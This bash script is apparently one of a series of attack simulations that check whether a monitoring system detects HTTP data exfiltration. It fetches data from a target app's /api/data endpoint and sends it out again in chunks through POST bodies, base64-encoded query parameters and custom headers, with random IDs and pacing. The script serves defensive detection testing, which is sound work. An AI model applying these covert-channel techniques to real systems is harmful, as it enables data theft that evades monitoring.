#!/usr/bin/env bash
# =============================================================================
# 10 — Data Exfiltration: HTTP Covert Channel
# Tool: curl (chunked uploads to attacker-controlled endpoint simulation)
# SSS should detect: data_exfiltration via outbound traffic anomaly
# =============================================================================
set -euo pipefail
source "$(dirname "${BASH_SOURCE[0]}")/common.sh"
attack_start "10_data_exfil_http"

VULN_PORT="${VULN_APP_PORT:-8888}"

# ---------------------------------------------------------------------------
# Step 1: Steal sensitive data from the target
# ---------------------------------------------------------------------------
echo "[*] Stealing data from ${TARGET_IP}:${VULN_PORT}/api/data..."
stolen_data=$(curl -s --max-time 10 \
    "http://${TARGET_IP}:${VULN_PORT}/api/data" 2>/dev/null) || stolen_data=""

if [[ -z "${stolen_data}" ]]; then
    record_result "false" "Could not reach /api/data endpoint to steal data." ""
    exit 0
fi

data_size=$(echo "${stolen_data}" | wc -c)
echo "[+] Sensitive data retrieved (${data_size} bytes)"

# ---------------------------------------------------------------------------
# Step 2: Exfiltrate via multiple HTTP methods
# ---------------------------------------------------------------------------
echo "[*] Simulating HTTP exfiltration via multiple methods..."

exfil_success=0
exfil_blocked=0
methods_tried=0

# Method 1: POST to the target's own echo endpoint (simulates attacker C2)
echo "  [1] POST exfil to target's echo endpoint..."
for i in $(seq 1 10); do
    chunk=$(echo "${stolen_data}" | cut -c$(( (i-1)*200 + 1 ))-$(( i*200 )))
    [[ -z "${chunk}" ]] && break

    http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
        -X POST "http://${TARGET_IP}:${VULN_PORT}/api/data" \
        -H "Content-Type: application/octet-stream" \
        -H "X-Request-ID: $(head -c 8 /dev/urandom | xxd -p)" \
        -d "${chunk}" 2>/dev/null) || http_code="000"

    methods_tried=$((methods_tried + 1))
    if [[ "${http_code}" == "000" ]]; then
        exfil_blocked=$((exfil_blocked + 1))
    else
        exfil_success=$((exfil_success + 1))
    fi
    sleep 0.5
done

# Method 2: GET with data in query parameters (steganographic)
echo "  [2] GET exfil via query parameters..."
encoded_snippet=$(echo "${stolen_data}" | head -c 500 | base64 -w 0 | tr '+/' '-_')
for i in $(seq 1 5); do
    chunk="${encoded_snippet:$(( (i-1)*80 )):80}"
    [[ -z "${chunk}" ]] && break

    http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
        "http://${TARGET_IP}:${VULN_PORT}/search?q=${chunk}" \
        2>/dev/null) || http_code="000"

    methods_tried=$((methods_tried + 1))
    if [[ "${http_code}" == "000" ]]; then
        exfil_blocked=$((exfil_blocked + 1))
    else
        exfil_success=$((exfil_success + 1))
    fi
    sleep 0.5
done

# Method 3: HTTP headers as covert channel
echo "  [3] Exfil via custom HTTP headers..."
for i in $(seq 1 5); do
    chunk=$(echo "${stolen_data}" | cut -c$(( (i-1)*100 + 1 ))-$(( i*100 )) | base64 -w 0)
    [[ -z "${chunk}" ]] && break

    http_code=$(curl -s -o /dev/null -w "%{http_code}" --max-time 5 \
        -H "X-Tracking: ${chunk}" \
        -H "X-Session: $(head -c 16 /dev/urandom | xxd -p)" \
        "http://${TARGET_IP}:${VULN_PORT}/health" \
        2>/dev/null) || http_code="000"

    methods_tried=$((methods_tried + 1))
    if [[ "${http_code}" == "000" ]]; then
        exfil_blocked=$((exfil_blocked + 1))
    else
        exfil_success=$((exfil_success + 1))
    fi
    sleep 0.5
done

echo "[*] HTTP exfil complete: ${exfil_success}/${methods_tried} requests succeeded, ${exfil_blocked} blocked."

# ---------------------------------------------------------------------------
# Determine result
# ---------------------------------------------------------------------------
if [[ ${exfil_blocked} -gt $((methods_tried / 2)) ]]; then
    evidence="HTTP exfil mostly blocked: ${exfil_blocked}/${methods_tried} requests refused."
    record_result "false" "${evidence}" "Data size: ${data_size} bytes"
elif [[ ${exfil_success} -gt 0 ]]; then
    evidence="HTTP exfil succeeded: ${exfil_success}/${methods_tried} requests completed. ${data_size} bytes of sensitive data exfiltrated."
    record_result "true" "${evidence}" "Data preview: $(echo "${stolen_data}" | head -c 300)"
else
    evidence="All HTTP exfiltration attempts were blocked."
    record_result "false" "${evidence}" ""
fi
